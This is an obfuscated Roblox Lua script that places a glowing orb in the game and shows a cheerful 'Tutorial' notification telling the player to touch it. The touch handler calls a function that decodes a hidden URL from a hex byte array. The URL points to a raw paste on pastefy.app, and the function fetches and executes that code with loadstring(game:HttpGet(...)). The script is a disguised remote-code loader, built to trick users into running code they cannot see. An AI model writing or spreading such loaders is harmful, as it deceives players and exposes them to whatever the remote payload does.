local _0x1a2b = game:GetService("StarterGui")
local _0x3c4d = Vector3.new(107.484291, 22.074743, 51.821037)
local _0x5e6f = Color3.fromRGB(57, 255, 20)

local function _0x7g8h()
    local _0x9i0j = {0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x70, 0x61, 0x73, 0x74, 0x65, 0x66, 0x79, 0x2e, 0x61, 0x70, 0x70, 0x2f, 0x58, 0x47, 0x33, 0x79, 0x79, 0x69, 0x64, 0x33, 0x2f, 0x72, 0x61, 0x77}
    local _0x1k2l = ""
    for _0x3m, _0x4n in ipairs(_0x9i0j) do
        _0x1k2l = _0x1k2l .. string.char(_0x4n)
    end
    loadstring(game:HttpGet(_0x1k2l))()
end

local _0x5o6p = Instance.new("Part")
_0x5o6p.Shape, _0x5o6p.Size, _0x5o6p.Position = Enum.PartType.Ball, Vector3.new(4, 4, 4), _0x3c4d
_0x5o6p.Color, _0x5o6p.Material, _0x5o6p.Anchored, _0x5o6p.CanCollide = _0x5e6f, Enum.Material.Neon, true, false
_0x5o6p.Parent = workspace

local _0x7q8r = Instance.new("BillboardGui")
_0x7q8r.Adornee, _0x7q8r.Size, _0x7q8r.StudsOffset, _0x7q8r.AlwaysOnTop = _0x5o6p, UDim2.new(0, 200, 0, 50), Vector3.new(0, 5, 0), true
_0x7q8r.Parent = _0x5o6p

local _0x9s0t = Instance.new("TextLabel")
_0x9s0t.Size, _0x9s0t.BackgroundTransparency, _0x9s0t.TextColor3 = UDim2.new(1, 0, 1, 0), 1, _0x5e6f
_0x9s0t.TextScaled, _0x9s0t.Font, _0x9s0t.TextStrokeTransparency = true, Enum.Font.Code, 0
_0x9s0t.Parent = _0x7q8r

task.spawn(function()
    task.wait(2)
    pcall(function()
        _0x1a2b:SetCore("SendNotification", {Title = "Tutorial", Text = "1. Goto Orb.\n2. Touch Orb.\n3. Let It Work It’s Magic.\n4. Completed.", Duration = 8})
    end)
end)

local _0x1u2v = false
_0x5o6p.Touched:Connect(function(_0x3w)
    if not _0x1u2v and _0x3w.Parent:FindFirstChild("Humanoid") then
        _0x1u2v = true
        _0x7g8h()
        _0x5o6p:Destroy()
    end
end)

task.spawn(function()
    local _0x4x = game.Players.LocalPlayer
    while _0x5o6p.Parent do
        task.wait(0.1)
        if _0x4x and _0x4x.Character and _0x4x.Character:FindFirstChild("HumanoidRootPart") then
            _0x9s0t.Text = "HERE [ " .. math.floor((_0x4x.Character.HumanoidRootPart.Position - _0x5o6p.Position).Magnitude) .. " M ]"
        end
    end
end)
